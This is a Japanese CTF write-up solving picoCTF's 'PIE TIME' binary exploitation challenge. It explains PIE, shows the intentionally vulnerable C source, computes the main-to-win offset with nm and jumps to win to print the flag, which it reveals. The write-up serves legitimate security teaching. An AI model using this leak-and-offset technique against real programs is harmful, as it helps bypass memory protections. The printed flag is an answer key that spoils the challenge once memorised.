# picoCTF Writeup: PIE TIME

**PIE**を知ろう問題

- ジャンル: Binary Exploitation
- 難易度: Easy

## Writeup

問題文
>Can you try to get the flag? Beware we have PIE!
Connect to the program with netcat:
$ nc rescued-float.picoctf.net 57566
flagとれるかな？PIEだからね。netcatでプログラムに接続してね。

**PIE**ってなんやねん。
`Position Independent Executable`というらしく、実行するごとにバイナリがロードされるメモリ番地が変わる仕組みとのこと。

```
$ nc rescued-float.picoctf.net 58731
Address of main: 0x5d568584b33d
Enter the address to jump to, ex => 0x12345: ^C
$ nc rescued-float.picoctf.net 58731
Address of main: 0x601e1d74233d
Enter the address to jump to, ex => 0x12345: ^C
$ nc rescued-float.picoctf.net 58731
Address of main: 0x5a8e65e4a33d
Enter the address to jump to, ex => 0x12345: ^C
```
確かに毎回`main`のアドレスが変わっていますね。

次に問題文にあるソースコードファイルをダウンロードして、中身を確認します。
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
`win`関数を呼び出せれば`flag.txt`が読まれるようです。

`main`関数では、ユーザにアドレス番地を入力させて`val`変数に格納します。
そして、`(void (*)())val`で`val`変数に入っているアドレスを関数として呼び出せる形へ変換して`foo`関数と定義しています。最後に`foo`関数（ユーザーが入力したメモリ番地の関数）を実行する流れです。

つまり、`win`関数のメモリ番地をユーザー入力として与えればよさそうですね。

`main`関数のメモリ番地は毎回変わってしまいますが、`main`関数と`win`関数の相対的な位置関係は変わらないです。

バイナリファイルをダウンロードして、メモリ番地を調べてみます。
`nm`コマンドが使えます。
```
$ nm /tmp/vuln | grep main
                 U __libc_start_main@@GLIBC_2.2.5
000000000000133d T main
$ nm /tmp/vuln | grep win
00000000000012a7 T win
```
`win`関数が`0x12a7`
`main`関数が`0x133d`
にあります。

引き算して差分を計算します。
```
$ python3 -c 'print(hex(0x133d - 0x12a7))'
0x96
```
`win`関数は`main`関数の`0x96`分上に位置していることがわかりました。

では、もう一度`nc`で接続します。
```
$ nc rescued-float.picoctf.net 57706
Address of main: 0x63e75664233d
Enter the address to jump to, ex => 0x12345:
```
`main`関数のメモリ番地は`0x63e75664233d`
引き算します。
```
$ python3 -c 'print(hex(0x63e75664233d - 0x96))'
0x63e7566422a7
```
では、`0x63e7566422a7`を入力します。

```
$ nc rescued-float.picoctf.net 57706
Address of main: 0x63e75664233d
Enter the address to jump to, ex => 0x12345: 0x63e7566422a7
Your input: 63e7566422a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_f8845f06}
```
flagが取れました。
